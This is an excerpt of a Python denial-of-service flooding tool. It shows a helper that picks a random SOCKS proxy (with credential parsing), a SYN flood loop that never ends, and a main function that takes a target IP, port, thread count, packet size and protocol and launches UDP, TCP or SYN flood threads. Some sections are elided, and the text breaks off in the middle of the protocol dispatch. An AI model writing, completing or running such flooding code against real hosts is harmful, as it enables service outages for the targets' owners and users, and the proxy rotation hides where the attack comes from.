...
def get_socket_with_proxy():
    raw = random.choice(proxies).strip()
    sock = socks.socksocket()
    
    if '@' in raw:
        try:
            creds, address = raw.split('@')
            username, password = creds.split(':', 1)
            ip, port = address.rsplit(':', 1)
            sock.set_proxy(proxy_type, ip, int(port), username=username, password=password)
        except Exception as e:
            print(f"{RED}[ProxyParser] Error parsing auth proxy: {raw} ({e}){RESET}")
            return None
    else:
        try:
            ...
            print(f"{RED}[ProxyParser] Error parsing proxy: {raw} ({e}){RESET}")
            return None
...
def syn_flood(target_ip, target_port, thread_id):
    ...
    while True:
        try:
            sock = get_socket_with_proxy() if use_proxy else socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            packet = b"\x00" * 60
...
def main():
    global proxy_type
    if len(sys.argv) < 6:
        print(f"Usage: python3 {sys.argv[0]} <ip> <port> <threads> <packet_size> <protocol> [payload_mode] [--proxy-type socks4|socks5]")
        sys.exit(1)
    ...
    payload_mode = sys.argv[6].lower() if len(sys.argv) > 6 and not sys.argv[6].startswith('--') else "random"
    ...
    for i in range(threads):
        if protocol == "udp":
            t = threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_size, i+1, payload_mode))
        elif protocol == "tcp":
            t = threading.Thread(target=tcp_flood, args=(target_ip, target_port, packet_size, i+1, payload_mode))
        elif protocol == "syn":
